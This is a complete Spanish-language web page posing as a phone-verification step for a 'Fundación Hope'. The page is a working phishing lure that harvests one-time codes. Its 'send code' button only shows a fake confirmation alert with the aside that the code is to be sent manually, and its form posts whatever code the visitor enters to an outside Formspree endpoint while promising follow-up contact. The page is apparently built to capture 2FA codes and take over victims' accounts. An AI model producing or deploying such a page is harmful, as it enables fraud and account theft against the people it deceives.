<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Verificación - Fundación Hope</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #f4f7fa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background: white;
    padding: 30px 40px;
    border-radius: 10px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
    max-width: 400px;
    width: 100%;
    text-align: center;
  }
  h1 {
    margin-bottom: 25px;
    color: #34495e;
  }
  button, input[type="submit"] {
    background-color: #2980b9;
    color: white;
    padding: 12px;
    font-size: 16px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-weight: bold;
    transition: background 0.3s ease;
    width: 100%;
    margin-bottom: 20px;
  }
  button:hover, input[type="submit"]:hover {
    background: #1f5f8b;
  }
  input[type="text"] {
    width: 100%;
    padding: 10px;
    font-size: 16px;
    border-radius: 6px;
    border: 1.5px solid #ccc;
    margin-bottom: 20px;
    transition: border-color 0.3s ease;
  }
  input[type="text"]:focus {
    border-color: #2980b9;
    outline: none;
  }
  #mensaje {
    font-weight: 600;
    margin-top: 10px;
    min-height: 24px;
  }
</style>
</head>
<body>

<div class="container">
  <h1>Verificación de Código</h1>
  <p>Pulsa "Enviar código" para recibir el código de verificación en tu teléfono.</p>
  <button id="btnEnviarCodigo">Enviar código de verificación</button>

  <form id="formVerificacion" action="https://formspree.io/f/xgoqzbkg" method="POST">
    <label for="codigo">Ingresa el código que recibiste:</label>
    <input type="text" id="codigo" name="codigo" placeholder="Código de verificación" required />
    <input type="submit" value="Verificar Código" />
  </form>

  <p id="mensaje"></p>
</div>

<script>
  const btnEnviarCodigo = document.getElementById('btnEnviarCodigo');
  const form = document.getElementById('formVerificacion');
  const mensaje = document.getElementById('mensaje');

  btnEnviarCodigo.addEventListener('click', () => {
    alert("Código enviado al teléfono registrado. (Envía el código manualmente)");
  });

  form.addEventListener('submit', function(event) {
    event.preventDefault();
    const formData = new FormData(form);

    fetch(form.action, {
      method: 'POST',
      body: formData,
      headers: { 'Accept': 'application/json' }
    }).then(response => {
      if (response.ok) {
        mensaje.textContent = "Código enviado correctamente. Pronto te contactaremos.";
        mensaje.style.color = "#27ae60";
        form.reset();
      } else {
        response.json().then(data => {
          if (Object.hasOwn(data, 'errors')) {
            mensaje.textContent = data["errors"].map(error => error["message"]).join(", ");
          } else {
            mensaje.textContent = "Error al enviar el código.";
          }
          mensaje.style.color = "#e74c3c";
        })
      }
    }).catch(() => {
      mensaje.textContent = "Error al enviar el código. Intenta nuevamente.";
      mensaje.style.color = "#e74c3c";
    });
  });
</script>

</body>
</html>
